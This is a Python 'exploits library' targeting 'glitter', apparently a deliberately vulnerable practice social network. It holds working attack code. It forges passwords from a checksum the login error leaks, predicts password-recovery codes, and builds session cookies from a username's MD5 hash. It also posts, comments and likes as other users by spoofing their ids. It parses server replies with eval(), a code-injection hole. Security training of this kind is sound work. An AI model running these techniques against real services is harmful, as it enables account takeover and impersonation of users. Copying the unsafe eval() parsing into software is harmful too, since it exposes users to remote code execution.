#startOfFile
# flicker.py
# Author: Noam Elihu
# Version: 2.0
# Platform: terminal
# Description: exploits libray for 'glitter'

## -------------------------- import libraries ---------------------------
import re # regex
import hashlib # for md5
import socket # for connection with the server
import requests # for working with the web server
from datetime import datetime # for getting dates
## ------------------------------ defines --------------------------------
# networking releated
ENCODING = 'utf-8'
SERVER_IP = '44.224.228.136'
SERVER_PORT = 1336
MAX_BYTES_RECIEVE = 2424

IMAGE_OBJECT_HTML_FORMAT = '<img src=\\"%s\\">' # % (src_link)

URL_CODE_REQ = 'http://glitter.org.il/password-recovery-code-request/'
URL_CODE_SEND = 'http://glitter.org.il/password-recovery-code-verification/'
URL_POST_FORMAT = 'http://glitter.org.il/glit?id=-1&feed_owner_id=%s&publisher_id=%s&publisher_screen_name=notAnIndianHacker&publisher_avatar=im1&background_color=White&date=%s&content=%s&font_color=black' # % (owner_id, pub_id, full_date, content)

# regex releated
RGX_RES_FORMAT = r'^(?P<code>\d\d\d)#(?P<description>[^\{\}]+){gli&&er}(?P<data>.*)##'
RGX_RES_CODE_G_NAME = 'code'
RGX_RES_DESC_G_NAME = 'description'
RGX_RES_DATA_G_NAME = 'data'
RGX_RES_CODE_INDEX = 0
RGX_RES_DESC_INDEX = 1
RGX_RES_DATA_INDEX = 2
RGX_PASSW_ERROR_FORMAT = r"^108#Illegal user login. Provided details do not match ascii checksum: (?P<checksum>\d+){gli&&er}"
RGX_CHECKSUM_G_NAME = "checksum"

# codes releated
OK_CODES = {
100:105,
110:115,
150:155,
200:205,
300:305,
310:315,
320:325,
350:355,
400:405,
410:415,
420:425,
430:435,
440:445,
500:505,
550:555,
650:655,
710:715,
720:725,
750:755,
760:765,
900:905,
}

REQ_FORMATS = {
100:'100#{gli&&er}{"user_name":"%s","password":"%s","enable_push_notifications":true}##', # % (name, pass)
110:'110#{gli&&er}%s##', # % (checksum)
300:'300#{gli&&er}{"search_type":"%s","search_entry":"%s"}##', # % (type, keyword)
320:'320#{gli&&er}%s##', # % (user_id)
410:'410#{gli&&er}[%s,%s]##', # % (user_id, wanted_id)
500:'500#{gli&&er}{"feed_owner_id":%s,"end_date":"%s","glit_count":%d}##', # % (id_to_search, current_date, glit_count)
550:'550#{gli&&er}{"feed_owner_id":%s,"publisher_id":%s,"publisher_screen_name":"%s","publisher_avatar":"im1","background_color":"%s","date":"%s","content":"%s","font_color":"%s","id":-1}##', # % (owner_id, pub_id, pub_name, bg_color, date, content, fg_color)
650:'650#{gli&&er}{"glit_id":%s,"user_id":%s,"user_screen_name":"%s","id":-1,"content":"TEST","date":"%s"}##', # % (glid_id, user_id, username, date)
710:'710#{gli&&er}{"glit_id":%s,"user_id":%s,"user_screen_name":"%s","id":-1}##', # % (glit_id, user_id, username)
750:'750#{gli&&er}{"glit_id":%s,"user_id":%s,"user_screen_name":"%s","id":-1}##', # % (glit_id, user_id, username)
}

# Other
EXIT_CODE = 1
MAX_ASCII_VALUE = 255
CAPITAL_A_ASCII = 65

BOOL_INDEX = 0
INFO_INDEX = 1

SEARCH_BY_SCREEN_NAME_KEY = 'SIMPLE'
SEARCH_BY_ID_KEY = 'ID'
## ----------------------------- functions -------------------------------

def md5_hash( data ):
	"""
	hashes the data in md5 hash
	:param data: data to hash
	:type data: str
	:return: hashed data
	:rtype: str
	"""
	result = hashlib.md5(data.encode(ENCODING))
	return ( result.hexdigest() )

def connect () :
	"""
	opens a socket with the server
	:return: the socket that was opend
	:rtype: socket
	"""
	socket_to_connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	address = (SERVER_IP, SERVER_PORT)
	socket_to_connect.connect(address)
	return ( socket_to_connect )

def send_recv ( given_socket, data ) :
	"""
	sends and recives a message from a socket and returns it
	:param given_socket: the socket to get the message from
	:type given_socket: socket
	:return: the message
	:rtype: str
	"""
	given_socket.sendall(data.encode(ENCODING))
	return ( given_socket.recv(MAX_BYTES_RECIEVE).decode(ENCODING) )

def parse_response (response ) :
	"""
	gets the code + description and the data from the response (by the agreed format)
	:param response: the request to send to the server
	:type response: str
	:return: the info from the response - code, description, data
	:rtype: tuple
	"""
	match = re.search(RGX_RES_FORMAT, response)
	if ( match == None ) :
		raise ValueError("Response wasn't in the expected format")
	else:
		return ( match.group(RGX_RES_CODE_G_NAME), match.group(RGX_RES_DESC_G_NAME), match.group(RGX_RES_DATA_G_NAME))

def evaluate_data(data):
	"""
	Evaluates a dict
	:param data: data to evaluate.
	:type data: str
	:returns dictionary: Evaluated string
	"""
	try:
		eval_data = eval(data)
		return eval_data
	except Exception:
		raise ValueError("Data couldn't be parsed as expected")

def calculate_checksum ( name, passw ) :
	"""
	calculates the checksum for a given user and password
	:param name: name of the user
	:type name: str
	:param passw: password of the user
	:type passw: str
	:return: checksum
	:rtype: int
	"""
	checksum = 0

	for i in name:
		checksum += ord(i)
	for i in passw:
		checksum += ord(i)
	
	return ( checksum )

def get_formatted_date () :
	"""
	gets date in the servers msg format
	:return: current date in valid format
	:rtype: str
	"""
	date = datetime.today().date()
	time = datetime.today().time()
	full_date = "%sT%sZ" % (date, time)
	return ( full_date )

def get_checksum_of_user_by_name ( sock, username ) :
	"""
	gets the checksum of a wanted user
	:param sock: connected socket
	:type sock: socket.socket
	:param username: username to check about
	:type username: str
	:return: checksum
	:rtype: str
	"""
	login_msg = REQ_FORMATS[100] % (username, "?")
	login_response = send_recv(sock, login_msg)
	match = re.search(RGX_PASSW_ERROR_FORMAT, login_response)
	if ( match == None ) :
		login_response = parse_response(login_response)
		raise ValueError(login_response[RGX_RES_DESC_INDEX])
	return ( match.group(RGX_CHECKSUM_G_NAME) )

def generate_str_by_checksum ( checksum ):
	"""
	creates a string with certain checksum.
	:param checksum: Checksum.
	:return: String with required checksum.
	:rtype: str
	"""
	valid_passw = ""
	while (checksum):
		if (checksum > MAX_ASCII_VALUE):
			tmp = ( MAX_ASCII_VALUE % checksum )
			valid_passw += chr(tmp)
			checksum -= tmp
		else:
			valid_passw += chr(checksum)
			checksum -= checksum
	return ( valid_passw )

def generate_valid_password ( sock, username ) :
	"""
	generates a valid password for a given username
	by getting the checksum and match a password to it
	:param sock: connected socket
	:type sock: socket.socket
	:param username: username to generate valid password for
	:type username: str
	:return: a valid password for that user
	:rtype: str
	"""
	target = int(get_checksum_of_user_by_name(sock, username))
	for i in username:
		target -= ord(i)
	return ( generate_str_by_checksum(target) )

def format_send_revc_parse_and_check ( sock, code, params=None ) :
	"""
	send a request to the server
	and returns whether the requests answered successfully
	and the response data
	:param sock: the socket to get the message from
	:type sock: socket
	:param code: request code
	:type code: int
	:param params: params needed for the message
	:type params: Tuple
	:return: wehether the request was successfull, the data of the response
	:rtype: Tuple
	"""
	if ( params ):
		msg = REQ_FORMATS[code] % params
	else:
		msg = REQ_FORMATS[code]
	response = send_recv(sock, msg)
	response = parse_response(response)
	check = (OK_CODES[code] == int(response[RGX_RES_CODE_INDEX]))
	return ( check, response[RGX_RES_DATA_INDEX] )

def login ( sock, name, passw ) :
	"""
	logs a user in with a given connection
	:param sock: connected socket
	:type sock: socket.socket
	:param name: name of the user
	:type name: str
	:param passw: password of the user
	:type passw: str
	:return: wehether the login was successfull, the data of the response
	:rtype: Tuple
	"""
	msg_code = 100
	params = (name, passw)
	return ( format_send_revc_parse_and_check(sock, msg_code, params) )

def validate_user ( sock, name, passw ) :
	"""
	validate a user by sending a valid checksum
	:param sock: connected socket
	:type sock: socket.socket
	:param name: name of the user
	:type name: str
	:param passw: password of the user
	:type passw: str
	:return: wehether the login was successfull, the data of the response
	:rtype: Tuple
	"""
	msg_code = 110
	checksum = calculate_checksum(name, passw)
	return ( format_send_revc_parse_and_check(sock, msg_code, checksum) )

def full_login ( sock, name, passw ) :
	"""
	:param sock: connected socket
	:type sock: socket.socket
	:param name: name of the user
	:type name: str
	:param passw: password of the user
	:type passw: str
	:return: wehether the login was successfull, the data of the response
	:rtype: Tuple
	"""
	data = login(sock, name, passw)
	if ( data[BOOL_INDEX] ) :
		data = validate_user(sock, name, passw)
		if ( data[BOOL_INDEX] ) :
			return ( True, evaluate_data(data[INFO_INDEX]) )
	else:
		return ( False, evaluate_data(data[INFO_INDEX]) )

def get_feed ( sock, feed_id, date, glit_count ) :
	msg_code = 500
	date = get_formatted_date()
	params = (feed_id, date, glit_count)
	res = format_send_revc_parse_and_check(sock, msg_code, params)
	return ( res[BOOL_INDEX], evaluate_data(res[INFO_INDEX]) )

def do_search ( sock, type, keyword ) :
	msg_code = 300
	params = (type, keyword)
	res = format_send_revc_parse_and_check(sock, msg_code, params)
	return ( res[BOOL_INDEX], evaluate_data(res[INFO_INDEX]) )

# Exploits
def recover_password (username, user_id) :
	"""
	sends a request to the server of a password recovery
	and returns the response
	:param username: username to recover password for
	:type username: str
	:param user_id: user_id of the user
	:type user_id: str
	:return: servers's response
	:rtype: str
	"""
	msg = requests.post(URL_CODE_REQ, json = username)
	date = datetime.today().strftime("%d%m-%H%M")
	user_code = ""
	for i in user_id:
		user_code += chr(int(i) + CAPITAL_A_ASCII)
	full_code = date.replace("-", user_code)
	msg = requests.post(URL_CODE_SEND, json = [username, full_code])
	return ( msg.text )

def get_visited_entities ( sock, user_id ) :
	"""
	get the entities that the user visited
	:param sock: connected socket
	:type sock: socket.socket
	:param user_id: user_id to check about
	:type user_id: str
	:return: whether the request was successfull, the data of the response
	:rtype: Tuple
	"""
	msg_code = 320
	res = format_send_revc_parse_and_check(sock, msg_code, user_id)
	return ( res[BOOL_INDEX], evaluate_data(res[INFO_INDEX]) )

def generate_cookie ( username ) :
	"""
	generate a cookie of a user
	for the web server based on a username
	:param username: username to generate for
	:type username: str
	:return: cookie
	:rtype: str
	"""
	cookie = "%s.%s.%s" %\
	(str(datetime.today().strftime("%d%m%Y")), md5_hash( username ), str(datetime.today().strftime("%H%M.%d%m%Y")))
	return ( cookie )

def post_comment ( sock, glit_id, user_id, username, full_date ) :
	"""
	posts a comment on a given glit
	:param sock: connected socket
	:type sock: socket.socket
	:param glit_id: id of the wanted glit
	:type glit_id: str
	:param user_id: id of the wanted user
	:type uesr_id: str
	:param username: username to of the wanted user
	:type username: str
	:param full_date: date to post in, in the valid format
	:type full_date:
	:return: wehether the request was successfull, the data of the response
	:rtype: Tuple
	"""
	msg_code = 650
	params = (glit_id, user_id, username, full_date)
	res = format_send_revc_parse_and_check(sock, msg_code, params)
	return ( res[BOOL_INDEX], evaluate_data(res[INFO_INDEX]) )

def post_post ( sock, owner_id, pub_id, pub_name, full_date, bg_color, fg_color, content ) :
	"""
	posts a post from a given user
	:param sock: connected socket
	:type sock: socket.socket
	:param name:
	:type name:
	:return:
	:rtype:
	"""
	msg_code = 550
	params = (owner_id, pub_id, pub_name, bg_color, full_date, content, fg_color)
	res = format_send_revc_parse_and_check(sock, msg_code, params)
	return ( res[BOOL_INDEX], evaluate_data(res[INFO_INDEX]) )


def do_like ( sock, glit_id, user_id, username ) :
	"""
	posts a like from a given user
	:param sock: connected socket
	:type sock: socket.socket
	:param glit_id: id of the wanted glit
	:type glit_id: str
	:param user_id: id of the wanted user
	:type uesr_id: str
	:param username: username to of the wanted user
	:type username: str
	:return: wehether the request was successfull, the data of the response
	:rtype: Tuple
	"""
	msg_code = 710
	params = (glit_id, user_id, username)
	res = format_send_revc_parse_and_check(sock, msg_code, params)
	return ( res[BOOL_INDEX], evaluate_data(res[INFO_INDEX]) )

def request_glance ( sock, user_id, wanted_id ) :
	"""
	request a glance on a given user from a given user
	:param sock: connected socket
	:type sock: socket.socket
	:param user_id: id of the wanted user
	:type uesr_id: str
	:param wanted_id: id of the wanted user to glance at
	:type wanted_id: str
	:return: wehether the request was successfull, the data of the response
	:rtype: Tuple
	"""
	msg_code = 410
	params = (user_id, wanted_id)
	res = format_send_revc_parse_and_check(sock, msg_code, params)
	return ( res[BOOL_INDEX], evaluate_data(res[INFO_INDEX]) )

def do_wow ( sock, glit_id, user_id, username ) :
	"""
	posts a wow from a given user
	:param sock: connected socket
	:type sock: socket.socket
	:param glit_id: id of the wanted glit
	:type glit_id: str
	:param user_id: id of the wanted user
	:type uesr_id: str
	:param username: username to of the wanted user
	:type username: str
	:return: wehether the request was successfull, the data of the response
	:rtype: Tuple
	"""
	msg_code = 750
	params = (glit_id, user_id, username)
	res = format_send_revc_parse_and_check(sock, msg_code, params)
	return ( res[BOOL_INDEX], evaluate_data(res[INFO_INDEX]) )
#endOfFile
